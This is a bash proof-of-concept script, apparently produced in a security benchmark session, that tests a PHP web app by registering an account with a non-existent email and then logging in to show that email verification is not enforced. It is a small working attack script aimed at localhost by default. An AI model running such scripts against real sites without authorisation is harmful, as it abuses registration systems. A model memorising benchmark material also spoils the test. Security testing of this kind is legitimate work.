#!/bin/bash
# POC: Demonstrates email verification bypass by registering with non-existent email and immediately logging in without email confirmation
# Target: ./repo
# Created: 2025-11-07T17:42:33.702Z
# Session: benchmark-XBEN-069-24-mhp4ra0s

# Email Verification Bypass POC
# Demonstrates that users can register with any email (including non-existent ones)
# and immediately access their account without email verification

TARGET_HOST="${1:-localhost:8080}"
REGISTER_ENDPOINT="http://$TARGET_HOST/api/register.php"
LOGIN_ENDPOINT="http://$TARGET_HOST/api/login.php"

# Generate unique credentials for this test
TIMESTAMP=$(date +%s)
TEST_USERNAME="emailbypass_${TIMESTAMP}"
TEST_EMAIL="nonexistent_${TIMESTAMP}@example.local"
TEST_PASSWORD="TestPass123!"

echo "[*] Email Verification Bypass POC"
echo "[*] Target: $TARGET_HOST"
echo "[*] Test Username: $TEST_USERNAME"
echo "[*] Test Email: $TEST_EMAIL"
echo ""

# Step 1: Register with non-existent email
echo "[+] Step 1: Registering account with non-existent email..."
REGISTER_RESPONSE=$(curl -s -X POST "$REGISTER_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=${TEST_USERNAME}&email=${TEST_EMAIL}&password=${TEST_PASSWORD}")

echo "Registration Response: $REGISTER_RESPONSE"
echo ""

# Check if registration was successful
if echo "$REGISTER_RESPONSE" | grep -q '"success":true'; then
  echo "[+] Registration successful!"
  echo ""
  
  # Step 2: Attempt login without any email verification
  echo "[+] Step 2: Attempting login WITHOUT email verification..."
  LOGIN_RESPONSE=$(curl -s -X POST "$LOGIN_ENDPOINT" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=${TEST_USERNAME}&password=${TEST_PASSWORD}")
  
  echo "Login Response: $LOGIN_RESPONSE"
  echo ""
  
  # Check if login was successful
  if echo "$LOGIN_RESPONSE" | grep -q '"success":true'; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] Login successful without email verification!"
    echo "[+] User was able to access account immediately after registration"
    echo "[+] No email verification token or confirmation mechanism enforced"
    exit 0
  else
    echo "[-] Login failed - email verification might be enforced"
    exit 1
  fi
else
  echo "[-] Registration failed"
  echo "[-] Could not proceed with test"
  exit 1
fi